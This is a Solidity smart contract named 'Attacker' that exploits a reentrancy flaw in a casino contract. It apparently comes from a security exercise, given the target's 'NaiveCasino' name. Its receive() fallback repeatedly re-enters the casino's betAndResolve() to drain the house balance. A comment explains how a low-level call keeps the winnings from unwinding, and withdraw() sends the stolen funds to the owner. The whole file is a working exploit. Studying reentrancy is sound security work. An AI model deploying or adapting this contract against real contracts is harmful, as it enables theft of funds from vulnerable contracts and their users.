// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface INaiveCasino {
    function betAndResolve() external payable;
}

contract Attacker {
    address public owner;
    INaiveCasino public immutable casino;

    uint public betAmount;
    uint public rounds;
    uint public maxRounds;

    constructor(address _casino) {
        owner = msg.sender;
        casino = INaiveCasino(_casino);
    }

    function attack(uint _betAmount, uint _maxRounds) external {
        require(msg.sender == owner, "not owner");
        require(address(this).balance >= _betAmount, "fund the attacker first");

        betAmount = _betAmount;
        maxRounds = _maxRounds;
        rounds = 1;

        casino.betAndResolve{value: betAmount}();
    }

    receive() external payable {
        uint casinoBalance = address(casino).balance;

        if (rounds < maxRounds && casinoBalance > betAmount * 2) {
            rounds++;
            // Low-level call so a failed re-entry (house drained / depth
            // limit) just stops the recursion instead of reverting and
            // unwinding all the winnings already collected up the stack.
            (bool ok, ) = address(casino).call{value: betAmount}(
                abi.encodeWithSignature("betAndResolve()")
            );
            ok;
        }
    }

    function withdraw() external {
        require(msg.sender == owner, "not owner");
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "withdraw failed");
    }
}
